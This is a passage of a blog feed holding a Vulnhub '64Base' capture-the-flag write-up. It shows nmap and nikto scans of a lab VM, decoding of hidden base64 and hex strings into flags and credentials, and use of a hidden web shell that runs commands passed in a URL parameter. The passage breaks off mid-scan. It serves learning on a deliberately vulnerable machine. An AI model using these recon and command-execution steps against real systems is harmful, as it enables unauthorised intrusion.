@@ -1,0 +1,1593 @@
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.4.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-02-16T18:20:13+01:00</updated><id>http://localhost:4000//</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - 64Base 1.0.1</title><link href="http://localhost:4000/2017/02/12/vulnhub-64base-writeup/" rel="alternate" type="text/html" title="Vulnhub.com - 64Base 1.0.1" /><published>2017-02-12T01:00:00+01:00</published><updated>2017-02-12T01:00:00+01:00</updated><id>http://localhost:4000/2017/02/12/vulnhub-64base-writeup</id><content type="html" xml:base="http://localhost:4000/2017/02/12/vulnhub-64base-writeup/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Today we're going to try and complete another challenge from Vulnhub, called 64Base. There are two objectives: the main one is to steal the plans for the Death Star before it's too late, and secondary quest consits of collecting all 6 flags. So without further suppression, let's jump in! &lt;/p&gt;
+
+&lt;h1&gt;Write-Up&lt;/h1&gt;
+
+&lt;p&gt;Firstly, we have to find what IP address was assigned to this machine.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap 192.168.56.1/24
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-02-10 15:31 EST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.1
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000076s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+All 1000 scanned ports on 192.168.56.1 are closed
+MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.100
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+All 1000 scanned ports on 192.168.56.100 are filtered
+MAC Address: 08:00:27:E5:1B:1D &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00024s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+4899/tcp open  radmin
+MAC Address: 08:00:27:68:E7:F8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0000070s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+All 1000 scanned ports on 192.168.56.101 are closed
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.50 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Okay, &lt;b&gt;192.168.56.102&lt;/b&gt; is our vulnerable machine. We also have some basic info about the ports - &lt;b&gt;ssh&lt;/b&gt;, &lt;b&gt;http&lt;/b&gt; and &lt;b&gt;radmin&lt;/b&gt;. &lt;/p&gt;
+
+&lt;h2&gt;First flag&lt;/h2&gt;
+
+&lt;p&gt;Let's start by checking the &lt;b&gt;80&lt;/b&gt; port, and the website. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/website-first.png&quot; alt=&quot;Website-First-Look&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;What's this random string in the subheader? &lt;b&gt;Base64&lt;/b&gt;? Let's check that out. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;dmlldyBzb3VyY2UgO0QK | base64 -d
+view &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; ;D&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great clue! After checking the source code, I've noticed this string in &lt;b&gt;header&lt;/b&gt; section of index. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Page Header --&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Set your background image for this header on the line below. --&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;header&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;intro-header&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;background-image: url('img/home-bg.jpg')&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+     &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+             &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+                 &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;site-heading&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+                     &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;64base&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+                     &lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;small&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+                     &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;subheading&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;dmlldyBzb3VyY2UgO0QK&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
+                     &lt;span class=&quot;c&quot;&gt;&amp;lt;!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a--&amp;gt;&lt;/span&gt;
+                 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+             &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+     &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;/header&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It looks like hexadecimals, which we can try to decode using &lt;b&gt;xxd&lt;/b&gt; tool. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a | xxd -r -p
+&lt;span class=&quot;nv&quot;&gt;ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After that, it's just simple base64 decryption.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
+flag1&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Yeah, first flag! But its content also looks like base64. Maybe it will reveal something more? &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
+64base:Th353@r3N0TdaDr01DzU@reL00K1ing4&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Password pair? Let's note that for later. &lt;/p&gt;
+
+&lt;h2&gt;Second flag&lt;/h2&gt;
+
+&lt;p&gt;I think that looking at this site manually searching for clues may take ages. &lt;b&gt;Nikto&lt;/b&gt; scan will be great help! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 192.168.56.102
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.102
++ Target Hostname:    192.168.56.102
++ Target Port:        80
++ Start Time:         2017-02-11 08:07:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ Server: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Server leaks inodes via ETags, header found with file /, fields: 0x1fdf 0x542f6bd9b68a0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/88888/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/88888888/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/88888888888/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/88888888888P/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/c3P08P/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/C3p0/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Entry &lt;span class=&quot;s1&quot;&gt;'/A280/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+...
++ &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt; contains 429 entries which should be manually viewed.
++ Apache/2.4.10 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;. Apache 2.0.65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final release&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3268: /mail/: Directory indexing found.
++ OSVDB-3092: /mail/: This might be interesting...
++ OSVDB-3092: /members/: This might be interesting...
++ OSVDB-3092: /order/: This might be interesting...
++ OSVDB-3092: /staff/: This might be interesting...
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-3092: /as/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;American Samoa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-3092: /by/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Belarus&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-3092: /is/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Iceland&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-3092: /no/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Norway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-3092: /to/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Tonga&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ 8115 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 434 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2017-02-11 08:07:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;39 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That's a lot of &lt;b&gt;robots.txt&lt;/b&gt; entries, but it may give us some interesting information. For now, let's save it. &lt;/p&gt;
+
+&lt;p&gt;What I've found even more interesting is this image in the post file. It's just full of this random (or not?) clues. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/website-image.png&quot; alt=&quot;Website-Image&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;IMPORTANT!!! USE SYSTEM INSTEAD OF EXEC TO RUN THE SECRET 5H377&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;What can it mean? And this comment under the image? &lt;/p&gt;
+&lt;p&gt;&lt;b&gt;Only respond if you are a real Imperial-Class BountyHunter&lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;At this moment it won't help us, but saving it for later may come handy.  &lt;/p&gt;
+
+&lt;p&gt;But, wait a minute. &quot;&lt;b&gt;Imperial-class&lt;/b&gt;&quot; also appears in robots.txt file. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Disallow: /houses/
+Disallow: /humans/
+Disallow: /Imperial/
+Disallow: /Imperial-class/
+Disallow: /individual/
+Disallow: /initial/
+Disallow: /instituted/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let's view it. Even though /Imperial-class/ was empty, I've still tried &lt;b&gt;/Imperial-Class/&lt;/b&gt;, which worked! &lt;/p&gt;
+&lt;p&gt;Unfortunately we have another problem, it immediately asks us for login and password. And no known credentials works. Maybe source code will tell us something more?  &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/imperial-class-login.png&quot; alt=&quot;Imperial-Class-Login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that's something useful. We can try to add &lt;b&gt;/BountyHunter&lt;/b&gt; to the URL. Also, do You remember the &quot;...real Imperial-Class BountyHunter&quot;? Great hint! &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/bountyhunter.png&quot; alt=&quot;BountyHunter-Login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Another login page... Once again I've tried to login as in the previuos form, but this time nothing happened. Maybe source code, once again, will show us something? Yes! I've noticed 3 strings, let's concatenate them together, and decode from hex.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c3252714d544a54626d51315a45566157464655614446525557383966516f3d0a | xxd -r -p
+&lt;span class=&quot;nv&quot;&gt;ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now decode this base64. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 -d
+flag2&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo&lt;span class=&quot;o&quot;&gt;=}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we've got second flag! Four more to go. But firstly, let's decode the inside of the flag, looking for a hint.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 -d
+https://www.youtube.com/watch?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vJwytFWA8uA&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Youtube film? &lt;/p&gt;
+
+&lt;h2&gt;Third flag&lt;/h2&gt;
+
+&lt;p&gt;I struggled a lot while trying to get this flag. Even this YouTube video couldn't help me :( After some time, maybe due to my luck, by playing with &lt;b&gt;curl&lt;/b&gt; and &lt;b&gt;login.php&lt;/b&gt; I got the next flag.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;curl -u 64base:Th353@r3N0TdaDr01DzU@reL00K1ing4 &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.56.102/Imperial-Class/BountyHunter/login.php&quot;&lt;/span&gt;
+
+flag3&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I've actually tried to login using these credentials, but nothing happened. Luckily, I got it here ;) Now let's decode this flag. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 -d
+53cr3t5h377/Imperial-Class/BountyHunter/login.php?f&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&amp;amp;c&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Fourth flag&lt;/h2&gt;
+
+&lt;p&gt;Let's take a look at this link. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/early-shell.png&quot; alt=&quot;Found-Link&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As I suspected, nothing happened.&lt;/p&gt;
+&lt;p&gt;Remember the image from the post page? It said to use system instead of exec. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/shell-system.png&quot; alt=&quot;System-shell&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That's what I like, another flag! Now, let's decode it. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NjRiYXNlOjY0YmFzZTVoMzc3Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
+64base:64base5h377&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Fifth flag&lt;/h2&gt;
+
+&lt;p&gt;After all that, I think we can try to work on the SSH ports. Firstly, I'll run another Nmap scan, checking all possible ports, to check, whether or not we are missing anything. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap -Pn -A -p- 192.168.56.102
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-02-11 13:48 EST
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh?
+80/tcp    open  http    Apache httpd 2.4.10 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| http-robots.txt: 429 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| /administrator/ /admin/ /login/ /88888/ /88888888/
+| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/
+|_/across/ /activation/ /Adjustments/
+|_http-server-header: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: 64base
+4899/tcp  open  radmin?
+62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
